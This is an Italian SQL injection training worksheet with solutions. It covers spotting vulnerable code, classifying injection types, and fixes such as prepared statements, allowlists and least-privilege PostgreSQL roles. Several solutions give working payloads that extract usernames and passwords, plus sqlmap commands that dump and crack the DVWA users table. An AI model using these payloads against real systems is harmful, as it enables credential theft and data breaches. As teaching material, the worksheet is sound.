Categoria A · Riconoscere la SQLi nel codice
ESERCIZIO 1

Le 3 condizioni — applicale

Per ognuno dei seguenti snippet, verifica la presenza delle 3 condizioni necessarie per una SQLi: (1) input user-controlled, (2) flusso verso query, (3) nessuna parametrizzazione.

A)  uid = request.form['id']
    cursor.execute("SELECT * FROM users WHERE id=%s", (uid,))

B)  name = os.environ['DEFAULT_USER']  # da var ambiente
    q = f"SELECT * FROM users WHERE name='{name}'"
    db.execute(q)

C)  search = request.args.get('q')
    q = "SELECT * FROM products WHERE title LIKE '%" + search + "%'"
    cursor.execute(q)
Mostra soluzione
A · NON vulnerabile. Input user-controlled (condizione 1) e flusso verso query (2), ma c'è parametrizzazione con %s (condizione 3 rotta). Sicuro.

B · NON vulnerabile (al momento). L'input viene da variabile d'ambiente controllata dal sysadmin, NON dall'utente (condizione 1 rotta). Attenzione: se in futuro quella variabile venisse alimentata da input esterno, diventerebbe vulnerabile — second-order.

C · VULNERABILE. Tutte e 3 le condizioni presenti: input da query string, concatenato in stringa SQL, nessuna parametrizzazione. Payload di attacco banale: %' UNION SELECT username,password FROM users--.
ESERCIZIO 2

Trova il tipo di SQLi

Per ognuno di questi scenari indica il tipo di SQLi più adatto all'attaccante (error / UNION / boolean / time / OOB) e perché:

  1. API REST che ritorna sempre {"status":"ok"} in caso di successo, {"status":"error"} in caso di errore, con stesso HTTP 200.
  2. Pagina di ricerca prodotti che mostra risultati in tabella HTML.
  3. Form di login che restituisce sempre la stessa pagina di errore 'Credenziali non valide' indipendentemente dal motivo.
  4. App dev con error page verbosa che stampa stack trace PHP.
  5. Target blindato dietro firewall restrittivo, ma il DB è autorizzato a fare lookup DNS esterni.
Mostra soluzione
1 → Blind Boolean-based. C'è differenza osservabile tra risposte (ok/error), anche se minima. Si inferisce 1 bit per request.

2 → In-band UNION-based. Tabella HTML = punto di output visibile. UNION SELECT appende righe che compaiono nella tabella.

3 → Blind Time-based. Nessuna differenza nel body né nello status. Serve pg_sleep / SLEEP(5) come canale di feedback.

4 → In-band Error-based. Error page verbosa = canale diretto. Basta forzare un errore con payload tipo ' AND 1=CAST(version() AS int)--.

5 → Out-of-band (OOB). Scenario classico: DNS egress aperto è il canale di esfiltrazione quando tutto il resto è bloccato.
ESERCIZIO 3

Costruisci il payload

Dato questo snippet PHP vulnerabile:

$id = $_GET['id'];
$q = "SELECT name, price FROM products WHERE id=" . $id;
$result = mysqli_query($conn, $q);

Costruisci 3 payload di attacco, uno per ogni tipo:

  1. In-band UNION per estrarre la colonna user e password dalla tabella users
  2. Blind boolean per verificare se la prima lettera della password di admin è 'a'
  3. Blind time per lo stesso obiettivo del punto 2
Mostra soluzione
1 · UNION-based (assumendo MySQL, 2 colonne):
?id=-1 UNION SELECT user,password FROM users--
Passaggio id=-1 forza la prima query a non restituire nulla, quindi la tabella HTML mostra solo i risultati della seconda SELECT.

2 · Boolean-based:
?id=1 AND SUBSTRING((SELECT password FROM users WHERE user='admin'),1,1)='a'
Se la prima lettera è 'a' → id=1 ritorna il prodotto. Altrimenti ritorna pagina vuota.

3 · Time-based:
?id=1 AND IF(SUBSTRING((SELECT password FROM users WHERE user='admin'),1,1)='a',SLEEP(5),0)
Se lettera 1 = 'a' → il DB dorme 5 secondi. Altrimenti risposta istantanea.

ESERCIZIO 4

Ricostruisci il comando sqlmap

Durante la demo, il formatore ha usato sqlmap contro DVWA. Senza guardare le slide, ricostruisci il comando esatto per:

  1. Testare il parametro id della pagina vulnerabilities/sqli/ autenticato con cookie di sessione e security=low
  2. Dopo detection, enumerare tutte le tabelle del database dvwa
  3. Dumpare la tabella users con crack automatico delle password
Mostra soluzione
1) sqlmap -u 'http://localhost:8080/vulnerabilities/sqli/?id=1' \
     --cookie='PHPSESSID=xxx; security=low' --batch

2) sqlmap -u 'http://localhost:8080/vulnerabilities/sqli/?id=1' \
     --cookie='PHPSESSID=xxx; security=low' \
     -D dvwa --tables

3) sqlmap -u 'http://localhost:8080/vulnerabilities/sqli/?id=1' \
     --cookie='PHPSESSID=xxx; security=low' \
     -D dvwa -T users --dump --passwords
Note: --batch per evitare prompt interattivi, utile in tutti gli step. --passwords aggiunge il crack automatico via hashcat/john con rockyou.txt.
ESERCIZIO 5

Interpreta il fingerprint

Durante la demo sqlmap ha prodotto questo output:

back-end DBMS: MySQL >= 5.0.12
banner: '5.7.28-0ubuntu0.18.04.4'
current user: 'dvwa@localhost'
current database: 'dvwa'
current user is DBA: False
available databases [4]:
[*] dvwa
[*] information_schema
[*] mysql
[*] performance_schema

Rispondi:

  1. Perché "current user is DBA: False" è una buona notizia per chi ha configurato il DB?
  2. Quali dei 4 database hanno dati "di business" e quali sono di sistema?
  3. Il flag --os-shell funzionerà in questo caso? Motiva.
Mostra soluzione
1. DBA=False significa che l'app non si collega come superuser. L'attaccante non può fare CREATE USER, GRANT, né scrivere file su disco via INTO OUTFILE. È un esempio di Least Privilege Principle applicato (Difesa 4).

2. Business: dvwa. Sistema: information_schema (catalog standard SQL, metadata), mysql (DB di sistema con utenti e privilegi MySQL), performance_schema (metriche runtime).

3. NO, --os-shell non funzionerà perché richiede privilegi DBA per abilitare INTO OUTFILE su directory scrivibile o creare UDF. Con user non-DBA, l'impatto massimo è lettura dati dalle tabelle accessibili.

ESERCIZIO 6

Fix Python · prepared statement

Data questa funzione Flask vulnerabile, riscrivila con prepared statement psycopg2:

@app.route('/user/<uid>')
def user_detail(uid):
    role = request.args.get('role', 'viewer')
    q = f"""
        SELECT u.name, u.email, r.permissions
        FROM users u
        JOIN roles r ON u.role_id=r.id
        WHERE u.id = {uid}
        AND r.name = '{role}'
    """
    return db.execute(q).fetchone()
Mostra soluzione
@app.route('/user/<uid>')
def user_detail(uid):
    role = request.args.get('role', 'viewer')
    cursor.execute(
        "SELECT u.name, u.email, r.permissions "
        "FROM users u "
        "JOIN roles r ON u.role_id=r.id "
        "WHERE u.id = %s "
        "AND r.name = %s",
        (uid, role)
    )
    return cursor.fetchone()
Note: entrambi i parametri (uid, role) vengono passati SEPARATAMENTE dalla query. Il driver psycopg2 gestisce il tipo (uid come int, role come string) automaticamente. Nota: uid arriva come stringa da Flask routing, va bene così — il driver lo converte in int per la query se la colonna è INT.
ESERCIZIO 7

Allowlist per ORDER BY

Devi permettere agli utenti di ordinare una lista prodotti per nome, prezzo, data o popolarità. ORDER BY non è parametrizzabile come valore. Scrivi il codice Python + SQL che applica allowlist correttamente.

Mostra soluzione
ALLOWED_SORT = {
    'name': 'name ASC',
    'price_asc': 'price ASC',
    'price_desc': 'price DESC',
    'date': 'created_at DESC',
    'popularity': 'view_count DESC',
}

@app.route('/products')
def products():
    sort_key = request.args.get('sort', 'name')
    # allowlist: se non presente, default sicuro
    order_by = ALLOWED_SORT.get(sort_key, ALLOWED_SORT['name'])
    
    cursor.execute(
        f"SELECT id, name, price FROM products ORDER BY {order_by}"
    )
    return cursor.fetchall()
Punti chiave:
1. ALLOWED_SORT è un dict finito, NON può contenere SQLi.
2. Se l'utente manda ?sort=malicious o ?sort=id; DROP TABLE, il .get() ritorna il default.
3. La concatenazione f"... {order_by}" è sicura PERCHÉ order_by è garantito essere uno dei valori del dict.
4. Il dict mappa chiave logica → frammento SQL, permettendo di cambiare il SQL (es. aggiungere un secondary sort) senza esporre logica SQL al client.
ESERCIZIO 8

DDL PostgreSQL · LPP DB user

Un'app e-commerce ha 3 tipi di ruoli runtime:

  • app_web: serve il frontend, deve leggere/scrivere users, orders, cart_items
  • app_admin: backoffice, oltre alle 3 tabelle sopra ha lettura anche di audit_log e può aggiornare orders.status
  • reporting: Grafana dashboard, sola lettura su orders e users

Scrivi il DDL PostgreSQL per i 3 utenti con permessi minimi.

Mostra soluzione
-- Utenti base con NO privilege
CREATE USER app_web WITH NOSUPERUSER NOCREATEDB
    NOCREATEROLE NOREPLICATION NOBYPASSRLS PASSWORD '...';
CREATE USER app_admin WITH NOSUPERUSER NOCREATEDB
    NOCREATEROLE NOREPLICATION NOBYPASSRLS PASSWORD '...';
CREATE USER reporting WITH NOSUPERUSER NOCREATEDB
    NOCREATEROLE NOREPLICATION NOBYPASSRLS PASSWORD '...';

-- Permessi base (CONNECT + USAGE)
GRANT CONNECT ON DATABASE ecommerce TO app_web, app_admin, reporting;
GRANT USAGE ON SCHEMA public TO app_web, app_admin, reporting;

-- app_web: CRUD su 3 tabelle
GRANT SELECT, INSERT, UPDATE, DELETE ON users, orders, cart_items TO app_web;
GRANT USAGE ON ALL SEQUENCES IN SCHEMA public TO app_web;

-- app_admin: come app_web + lettura audit + update status
GRANT SELECT, INSERT, UPDATE, DELETE ON users, orders, cart_items TO app_admin;
GRANT SELECT ON audit_log TO app_admin;
GRANT USAGE ON ALL SEQUENCES IN SCHEMA public TO app_admin;

-- reporting: solo SELECT
GRANT SELECT ON orders, users TO reporting;
Note: (1) NO DDL per nessuno dei 3 — le migrations usano utente separato app_migration attivato solo in deploy. (2) USAGE ON SEQUENCES serve per nextval() sui campi auto-increment durante INSERT. (3) reporting non ha GRANT su cart_items: non serve per dashboard, meglio minimizzare.

ESERCIZIO 9

Code review · trova 3 bug

Code review di questo endpoint Flask. Identifica almeno 3 problemi di sicurezza e come li risolveresti:

@app.route('/admin/user-search', methods=['POST'])
def user_search():
    name = request.form.get('name')
    dept = request.form.get('department')
    
    # 1
    q = f"SELECT * FROM users WHERE name LIKE '%{name}%'"
    if dept:
        q += f" AND department = '{dept}'"
    
    # 2
    try:
        result = db.execute(q).fetchall()
    except Exception as e:
        return f"DB error: {e}", 500
    
    # 3
    return jsonify([dict(r) for r in result])
Mostra soluzione
Bug 1 · Concatenazione SQL doppia (nome + department). Entrambi i parametri vanno in stringa SQL. Fix: prepared statements con %s per entrambi e query costruita dinamicamente ma con bind.

Bug 2 · Error message leak. In caso di errore DB, l'eccezione viene restituita al client. Se la query fallisce con "column 'email' does not exist", l'attaccante scopre lo schema. Fix: loggare e server-side, restituire errore generico al client.

Bug 3 · Endpoint /admin senza auth check. Non c'è controllo di ruolo. Chiunque conosca l'URL può cercare user/dept. Fix: decoratore @require_admin o middleware che verifica JWT/cookie con ruolo.

Bonus · Manca input validation. name e dept potrebbero essere None, lunghissimi, o contenere char inutili. Fix: validazione lunghezza + whitelist caratteri se applicabile.

Versione corretta: 
@app.route('/admin/user-search', methods=['POST'])
@require_admin
def user_search():
    name = request.form.get('name', '').strip()[:100]
    dept = request.form.get('department', '').strip()[:50]
    
    if dept:
        cursor.execute(
            "SELECT id,name,email FROM users "
            "WHERE name ILIKE %s AND department = %s",
            (f'%{name}%', dept)
        )
    else:
        cursor.execute(
            "SELECT id,name,email FROM users WHERE name ILIKE %s",
            (f'%{name}%',)
        )
    
    try:
        result = cursor.fetchall()
    except Exception as e:
        app.logger.error(f"DB error: {e}")
        return jsonify({"error": "search failed"}), 500
    
    return jsonify([dict(r) for r in result])
ESERCIZIO 10

Scenario completo · progetta le difese

Sei il security architect di una nuova API REST per un'app bancaria. Il team dev propone questo stack:

  • FastAPI (Python) + SQLAlchemy ORM
  • PostgreSQL 16 in RDS AWS
  • AWS WAF davanti all'ALB
  • L'app gira come postgres user per "semplicità del deploy"

Il PM chiede: "Abbiamo già ORM e WAF, basta così?". Rispondi con un piano di difesa in 5 punti concreti, ordinati per priorità.

Mostra risposta tipica
No, assolutamente non basta. Ecco il piano in 5 punti:

1 · STOP · usare postgres superuser come app user è inaccettabile per un'app bancaria. Prima di andare live: creare app_runtime con NOSUPERUSER + GRANT minimi sulle tabelle di business. Questo è il fix più urgente — senza di esso, una singola SQLi = game over (COPY FROM PROGRAM → RCE → esfiltrazione di tutto il DB).

2 · Code review ORM · audit "raw()" / "text()" / "execute()". SQLAlchemy è sicuro con API idiomatica, ma ogni session.execute(text(...)) o .raw() deve essere esaminato. Se ci sono, devono usare .bindparams(). Automazione: regola bandit o semgrep nel CI che segnala questi pattern.

3 · Input validation + Pydantic schema. FastAPI ha Pydantic di default: usarlo per validare TUTTI gli input in ingresso. Tipi forti (int, UUID, Decimal, enum) bloccano la maggior parte dei payload SQLi banali prima che tocchino il DB.

4 · Logging + audit · pgAudit attivato. App bancaria = compliance. Installare pgAudit, configurare pgaudit.log = 'write,ddl' o 'all' in base alla sensibilità. Integrazione con CloudWatch + alerting per anomalie (query unexpected, UNION, slow query > 5s).

5 · WAF come ultimo livello, non primo. AWS WAF con OWASP Top 10 Managed Rules è utile per rallentare attacchi automatizzati e loggare pattern noti. MA: ha bypass, falsi positivi, e NON sostituisce i punti 1-4. Tenerlo in modalità "count" per 2 settimane per tarare le regole prima di switch a "block".

Bonus · RLS per data isolation. Per app multi-tenant bancaria, considerare Row-Level Security su tabelle critiche (conti, transazioni): utente X vede solo tenant_id = X. Difesa completa contro SQLi su filtraggio authorization.
